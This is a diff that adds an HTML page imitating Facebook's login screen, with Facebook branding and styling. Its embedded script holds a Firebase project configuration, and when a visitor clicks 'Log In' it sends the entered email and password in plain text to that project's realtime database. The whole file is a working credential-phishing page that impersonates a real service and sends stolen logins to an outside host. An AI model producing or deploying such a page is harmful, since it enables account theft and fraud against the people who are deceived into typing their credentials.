@@ -1,0 +1,103 @@
+<html>
+<head>
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #165dbb;
+        }
+        .login-container a {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <!-- Add Firebase products that you want to use -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeUUzEqwlDK9eQHuOn-ssuS0hfIinHeVQ",
+            authDomain: "fblogin-ff1b2.firebaseapp.com",
+            databaseURL: "https://fblogin-ff1b2-default-rtdb.firebaseio.com/",
+            projectId: "fblogin-ff1b2",
+            storageBucket: "fblogin-ff1b2.appspot.com",
+            messagingSenderId: "38639161997",
+            appId: "1:38639161997:web:9d3c483a6eb678c6a588c4",
+            measurementId: "G-0G0T6MJSWB"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        function storeUserData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            firebase.database().ref('users/').push({
+                email: email,
+                password: password
+            }).then(() => {
+                alert('Data stored successfully!');
+            }).catch((error) => {
+                alert('Error: ' + error.message);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="storeUserData()">Log In</button>
+        <a href="#">Forgot Password?</a>
+        <hr>
+        <button style="background-color: #42b72a; margin-top: 10px;">Create New Account</button>
+    </div>
+</body>
+</html>
